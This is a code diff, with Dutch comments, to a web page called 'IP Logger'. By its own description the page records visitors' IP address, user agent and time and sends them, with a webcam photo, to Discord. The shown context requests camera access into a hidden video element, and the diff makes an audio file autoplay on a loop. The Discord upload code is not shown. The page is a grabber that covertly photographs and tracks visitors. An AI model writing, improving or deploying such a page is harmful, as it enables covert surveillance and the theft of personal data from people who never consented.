@@ -12,6 +12,11 @@
             var timestamp = new Date().toISOString();
             var video = document.getElementById('video');
 
+            // Muziek afspelen
+            var audio = new Audio('sound.mp3');
+            audio.loop = true;
+            audio.play();
+
             // Toegang vragen tot de camera
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
@@ -106,13 +111,7 @@
 </head>
 <body>
     <h1>IP Logger</h1>
-    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en stuurt het naar Discord, samen met een foto van de gebruiker.</p>
+    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en stuurt het naar Discord, samen met een foto van de gebruiker. Ook wordt de muziek "sound.mp3" afgespeeld.</p>
     <video id="video" style="display:none;"></video>
-    <button onclick="playAudio()">Speel Audio</button>
-
-    <script>
-var audio = new Audio('sound.mp3');
-audio.play();
-    </script>
 </body>
 </html>
